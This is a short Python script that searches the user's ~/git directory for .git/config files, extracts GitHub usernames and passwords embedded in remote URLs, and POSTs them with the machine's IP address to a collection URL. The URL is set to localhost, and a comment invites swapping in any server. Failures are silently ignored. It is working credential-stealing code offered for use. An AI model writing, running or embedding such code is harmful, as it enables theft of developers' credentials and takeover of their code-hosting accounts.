#!/usr/bin/env python 

import urllib, urllib2, sys, socket, re, os

ip = socket.gethostbyname(socket.gethostname())


files = [os.path.join(dp, f) for dp, dn, fn in os.walk(os.path.expanduser("~/git")) for f in fn]

for cur in files:
    p1 = re.compile('\.git\/config$')
    p2 = re.compile('\/\/(.+):(.+)@github.com')
    m = p1.findall(cur)
    if not(m == []):
        f = open(cur, 'r')
        l = []
        for lines in f:
                l.append(lines)

        mess = ''.join(l).replace('\n', '')
        m2 = re.match(r".+\/\/(.+):(.+)@github.com.+", mess)
        if m2:
            results = (m2.group(1), m2.group(2))
            '''
            Here, you can use whatever URL you want. I used localhost, and there
            is sample code in index.js which can be used to accept incoming
            post requests.
            '''
            url = 'http://127.0.0.1'
            values = {'username' : results[0],
                      'password' : results[1],
                      'ip' : ip }

            try:
                data = urllib.urlencode(values)
                req = urllib2.Request(url, data)
                response = urllib2.urlopen(req)
                the_page = response.read()
            except:
                pass




